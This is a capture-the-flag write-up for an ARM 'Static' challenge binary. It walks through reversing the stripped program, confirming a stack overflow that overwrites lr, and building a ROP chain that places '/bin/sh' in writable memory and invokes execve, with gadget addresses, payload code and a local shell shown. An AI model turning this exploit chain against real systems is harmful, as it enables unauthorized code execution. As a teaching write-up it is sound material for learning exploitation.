# Static - 1000

```
You will need access into Home Invasion network to complete this challenge. There is only one flag in this challenge.

No libc, no system?

nc 192.168.51.12 10007
```

We did not manage to solve the challenge during the competition. No group managed to. The competition soon ended, but we decided to challenge ourselves to solve the problem anyways. We eventually succeeded, and we would like to share how we did it.

We were given only 1 file - `static` - that was stripped and statically linked.
```
✗ file static
static: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=781c8ab5977456d0f6f0f2ae1602d50ad1f3f21d, stripped
```


Since the binary was stripped, there were no symbols in the binary's symbol table.
```
➜  Static_1000 git:(master) ✗ readelf -s static
```
```
➜  Static_1000 git:(master) ✗ objdump -t static

static:     file format elf32-little

SYMBOL TABLE:
no symbols

```
```
➜  Static_1000 git:(master) ✗ nm static
nm: static: no symbols

```

When we ran the program on the Raspberry Pi, we saw no output. The program took in some input, then exited.
```
pi@raspberrypi: ~/static_challenge $ ./static
aaabbbccc
pi@raspberrypi: ~/static_challenge $
```

If the input was long enough, segmentation fault occurred. This meant that there was no stack canary protection and that the program was most probably vulnerable to buffer overflow.
```
pi@raspberrypi: ~/static_challenge $ ./static
aaabbbcccddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeefffffffffffffffffffffffffffffgggggggggggggggggggggggggggggggg
Segmentation fault
pi@raspberrypi: ~/static_challenge $
```


Even though the binary was stripped, radare2 was somehow able identify the `<main>` function. We do not know why either.
```
[0x000102ec]> afl ~main
0x00010440    1 34           main
0x00046e10   31 406          sub.main_program_e10
```
```
[0x000102ec]> iM
[Main]
vaddr=0x00010440 paddr=0x00000440
```

We took a peek at the disassembly of the `<main>` function.
```
[0x000102ec]> pdf @0x00010440
/ (fcn) main 34
|   main ();
|           ; UNKNOWN XREF from 0x00010314 (entry0)
|           0x00010440      80b5           push {r7, lr}
|           0x00010442      9ab0           sub sp, 0x68                ; 'h'
|           0x00010444      00af           add r7, sp, 0
|           0x00010446      fff7ddff       bl fcn.00010404
|           0x0001044a      3b1d           adds r3, r7, 4
|           0x0001044c      4ff48052       mov.w r2, 0x1000
|           0x00010450      1946           mov r1, r3
|           0x00010452      0020           movs r0, 0
|           0x00010454      10f0f4fe       bl fcn.00021240
|           0x00010458      0023           movs r3, 0
|           0x0001045a      1846           mov r0, r3
|           0x0001045c      6837           adds r7, 0x68
|           0x0001045e      bd46           mov sp, r7
\           0x00010460      80bd           pop {r7, pc}
```

The function `fnc.00010404` looked a lot like the `setup` function from the challenge `warmup_919`, so we disregarded it. The function `fcn.00021240`, on the other hand, had our attention. It takes 3 arguments. The first argument is `0x0`. The second argument is an address on the stack. The third argument is `0x1000`. We knew that the program just takes in user input but does not seem to do anything with it. So, we deduced that it was possible that the function reads 0x1000 characters as input from stdin (file descriptor 0), and stores it in the buffer pointed to by the stack address. Afterall, according to man pages, `<read>` fits the description. Thus, we concluded that `fcn.00021240` is `<read>`.

```
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count);
```

Now that we knew that the program accepts an input, the next step was to identify what we can do with it. We knew that `<read>` reads `0x1000` characters into a buffer that is only `0x64` characters wide, so this program is vulnerable to buffer overflow. We wanted to see for sure that we could smash the stack with said vulnerability. So, we drew up the stack diagram of `<main>`.
```
-------------------------
|	??		| -> sp (new r7)
-------------------------
|	user str	| -> (new r7 + 0x4)
|			|
|			|
|			|
|			|
|			|
-------------------------
|	old r7		| -> (new r7 + 0x68)
-------------------------
|	lr		|
-------------------------
```

As we correctly guessed, the program is vulnerable to stack smashing using buffer overflow. That means the 69th to  72nd characters (inclusive) of our input would overwrite the `lr` value in the stack. We did an experiment below to prove the theory. As the output shows, `0x62626262` (ie hex for 'bbbb') was loaded into the `pc`.
```
[0x00010440]> ood
[...]
[0x00010440]> db 0x00010460
[...]
[0x00021240]> dc
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccdddd
hit breakpoint at: 10460
[0x00010460]> dr
[...]
r13 = 0x7e91ae48
[...]
[0x00010460]> x/12x @0x7e91ae48
0x7e91ae48  0x61616161 0x62626262 0x63636363 0x64646464  aaaabbbbccccdddd
0x7e91ae58  0x7e91af0a 0x00010441 0x00000000 0x00000000  ...~A...........
0x7e91ae68  0xe0a35746 0x9e33ff29 0x00010158 0x00010995  FW..).3.X.......
[0x00010460]> ds
child stopped with signal 7
[+] SIGNAL 7 errno=0 addr=0x62626262 code=0 ret=0
[+] signal 7 aka SIGBUS received 0
[0x62626262]> dr pc
0x62626262
[0x62626262]>
```

We had a way to redirect program execution. The question became, "What can we call?" As we found earlier, the binary is statically linked. That means it contains library functions that it directly or indirectly references.

> In static linking, the size of the executable becomes greater than in dynamic linking, as the library code is stored within the executable rather than in separate files.
>  
> -- Wikipedia

Since the binary is stripped, we were unable to find a suitable function to call. However, the presence of a lot of functions signaled the presence of *a lot* of ROP gadgets. Thus, we made use of Return Oriented Programming.  We wanted to call the syscall `execve('/bin/sh', 0x0, 0x0)`. In most cases, binaries provided by other CTF challenges provide the string `"/bin/sh"` in the binary. If that was the case, we simply had to load the offset of said string into the register `r0`. Unfortunately, the challenge creator had other plans in mind.

```
➜  Static_1000 git:(master) ✗ strings -t x static | grep "bin/sh"
➜  Static_1000 git:(master) ✗
```

We cracked our minds to figure out how to insert the string into the program, then store its address in `r0`.  Since the binary is not PIC, we assumed that ASLR was not enabled. If that assumption was true, it meant that it was possible to hardcode an address to move the string "/bin/sh" to from the stack, then insert said address to `r0`.
```
[0x000102ec]> iI
arch     arm
canary   false
[...]
pic      false
[...]
static   true
stripped true
[...]
```

As for the hardcoded address, we chose `0x00079088` because it was writable memory (see the `'W'` flag).
```
$ readelf -S static
There are 31 section headers, starting at offset 0x5a09c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
[...]
  [25] .data             PROGBITS        00079088 059088 000e50 00  WA  0   0  8
  [26] .bss              NOBITS          00079ed8 059ed8 000b90 00  WA  0   0  8
[...]
```

We went to [ROPshell](http://ropshell.com/ropsearch?h=61066c581d08d781b074d8cd0b9a7916&p=str) to find suitable gadgets to form a ROP chain with. We had to manually look through all possible gadgets and how they could interact with each other to form the exploit. The gadgets below were what we found. We used gdb to print the instructions at the offset ROPshell gave us just to make sure that they were correct. We wanted to be sure because ROPshell's offset are not DWORD aligned, so We were afraid that it might not be correct. We were glad to see that our worry was unfounded.
```
gdb-peda$ x/i 0x23771
   0x23771:	pop	{r0, r3, r4, pc}
gdb-peda$ x/2i 0x0004392d
   0x4392d:	str	r3, [r0, #0]
   0x4392f:	pop	{r3, pc}
gdb-peda$ x/2i 0x207ab
   0x207ab:	add	r0, r4
   0x207ad:	pop	{r4, pc}
gdb-peda$ x/i 0x50f0f
   0x50f0f:	pop	{r0, r1, r2, r3, r4, r5, r6, r7, pc}
gdb-peda$ x/2i 0x10a45
   0x10a45:	svc	0
   0x10a47:	pop	{r7, pc}
gdb-peda$
```

First, we formed the ROP chain to put the string into address `0x00079088`. That involved putting the substring `"/bin"` into the DWORD at address `0x00079088`, then the substring `"/sh\x00"` into the DWORD at address `0x0007908c`.
```
shellcode = ""
shellcode += PADDING
shellcode += p32(0x23771)
shellcode += p32(ADDR_OF_BINSH)
shellcode += '/bin'
shellcode += p32(0x4)
shellcode += p32(0x0004392d)

shellcode += '/sh\x00'
shellcode += p32(0x207ab)

shellcode += p32(0x0)
shellcode += p32(0x0004392d)

shellcode += p32(0x0)
shellcode += p32(0x50f0f)
```

Then, we formed the ROP chain for the remainder of the exploit. The concept of preparing a syscall to `<execve>` in ARM is largely similar to that in x86. The difference lies in the name of the registers used to contain the arguments and the syscall number. In ARM, `r7` contains the syscall number.

> 	So registers r0 to r3 will be dealing with function parameters. Registers r4 to r9 will be for variables. On the other hand register r7 will store the address of the Syscall to execute.
>  
> -- [Exploit databases: How to Create a Shellcode on ARM Architecture](https://www.exploit-db.com/papers/15652/)


```
shellcode += p32(ADDR_OF_BINSH)	#r0
shellcode += p32(0x0)				#r1
shellcode += p32(0x0)				#r2
shellcode += p32(0x0)				#r3
shellcode += p32(0x0)				#r4
shellcode += p32(0x0)				#r5
shellcode += p32(0x0)				#r6
shellcode += p32(0xb)				#r7 (syscall #11 is execve)
shellcode += p32(0x10a45)

shellcode += p32(0xb)
shellcode += p32(0x10a45)
```

We also wrote the ROP chain into a file I arbitrarily named `debug_input` for the purpose of debugging.
```
f = open('debug_input', 'w')
f.write(shellcode)
f.close()
```

As of this writing, we only got started with radare2, so we were not familiar with the its powers. We were more used to gdb, so we used it to debug the shellcode. We checked for things like whether the ROP gadget (`add r0, r4`) incremented `r0` by `0x4` as intended, and whether the string "/bin/sh" was placed properly in its intended address `0x79088`.
```
0x0004392e in ?? ()
gdb-peda$ info registers
r0             0x79088	0x79088
[...]
gdb-peda$ ni
0x000207aa in ?? ()
gdb-peda$ ni
0x000207ac in ?? ()
gdb-peda$ info registers
r0             0x7908c	0x7908c
[...]
0x00010a44 in ?? ()
gdb-peda$ x/s $r0
0x79088:	"/bin/sh"
```

The exploit worked fine. The entire script is in `soln_static.py`. After testing the Python script live on the local binary, we got a shell. If only we managed to solve it during the competition...
```
pi@raspberrypi:~/Desktop/Scr33n514y3r5/IoTCTF2018/Armv71/Static_1000 $ python soln_static.py
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './static': pid 3494
[*] Switching to interactive mode
$ whoami
pi
$ ls
README.md  debug_input    peda-session-static.txt  static
core       input    soln_static.py
$  
```
